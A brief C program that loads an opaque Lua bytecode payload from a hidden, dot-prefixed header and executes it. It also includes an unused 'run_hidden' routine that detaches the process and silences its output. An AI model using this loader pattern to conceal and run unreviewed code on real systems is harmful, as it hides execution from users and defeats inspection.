#include <lua.h>
#include <lualib.h>
#include <lauxlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include ".__byte_payload.h"

void run_hidden(){
    if(fork()>0) exit(0);
    setsid();
    fclose(stdout);
    fclose(stderr);
}

int main(){
    lua_State *L=luaL_newstate();
    luaL_openlibs(L);

    unsigned char *buf=byte_payload;
    size_t len=byte_payload_len;
    if(luaL_loadbuffer(L,(char*)buf,len,"byte")||lua_pcall(L,0,0,0)){
        return 1;
    }

    lua_close(L);
    return 0;
}
